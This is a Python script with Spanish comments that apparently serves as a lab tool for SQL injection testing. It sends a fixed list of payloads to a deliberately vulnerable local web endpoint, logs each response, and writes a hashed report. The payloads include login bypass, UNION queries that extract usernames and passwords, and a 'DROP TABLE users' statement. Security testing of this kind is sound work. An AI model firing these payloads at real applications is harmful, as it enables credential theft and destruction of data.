import requests
import logging
import hashlib
import os
from datetime import datetime

#Configuracion del log
logging.basicConfig(
    filename='injection_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

#Lista de Payloads
PAYLOADS = [
    "' OR '1'='1 --",
    "' UNION SELECT username, password FROM users --",
    "' AND '1'='1 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT * FROM nonexistent_table --",
    "'; DROP TABLE users; --"
]

#Registra el resultado de cada prueba de inyeccion
def log_results(payload: str, result: str) -> None:
    logging.info(f'Payload: {payload} - Resultado: {result}')

#Funcion para calcular el hash 256del archivo
def calcular_hash(archivo: str) -> str:
    sha256_hash = hashlib.sha256()
    with open(archivo, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

#Funcion para generar el reporte de las inyecciones realizadas
def generate_report(results: dict) -> str:
    report_filename = (
        f'reporte_inyeccion_sql_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    )
    with open(report_filename, 'w') as report_file:
        report_file.write("###########################################\n")
        report_file.write("=== Reporte de Pruebas de Inyeccion SQL ===\n")
        report_file.write("###########################################\n")
        report_file.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for payload, result in results.items():
            report_file.write(f"Payload: {payload}\nResultado: {result}\n\n")
    
    print(f"[+] Reporte guardado en: {report_filename}")
    return report_filename

#Funcion para ejecutar las pruebas de inyeccion SQL en la aplicacion web vulnerable
def test_sql_injection() -> dict:
    results = {}

    for payload in PAYLOADS:
        try:
            response = requests.get(
                f'http://127.0.0.1:5000/vulnerable?input={payload}'
            )
            if response.status_code == 200:
                results[payload] = "[+] Inyeccion exitosa: " + response.text
            else:
                results[payload] = (
                    f"[!] Error en la consulta: Codigo de estado {response.status_code}"
                )
        except requests.exceptions.RequestException as e:
            results[payload] = f"[!] Error en la conexion: {e}"
        except Exception as e:
            results[payload] = f"[!] Error inesperado: {e}"

        log_results(payload, results[payload])

    return results

#Funcion para ejecutarse desde el menu
def run_injection_tests():
    test_results = test_sql_injection()
    report_filename = generate_report(test_results)
    
    #Calcular el hash del archivo de reporte
    hash_reporte = calcular_hash(report_filename)
    
    #Obtener la fecha y hora actual
    fecha_ejecucion = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    #Obtener la ubicacion absoluta del archivo
    ubicacion_archivo = os.path.abspath(report_filename)
    
    # Desplegar el mensaje en la terminal
    print(f"Se ejecuto la tarea 'Pruebas de Inyeccion SQL' en la fecha {fecha_ejecucion}\n "
          f"hash del reporte: {hash_reporte}\n "
          f"ubicacion del archivo: {ubicacion_archivo}")

if __name__ == "__main__":
    run_injection_tests()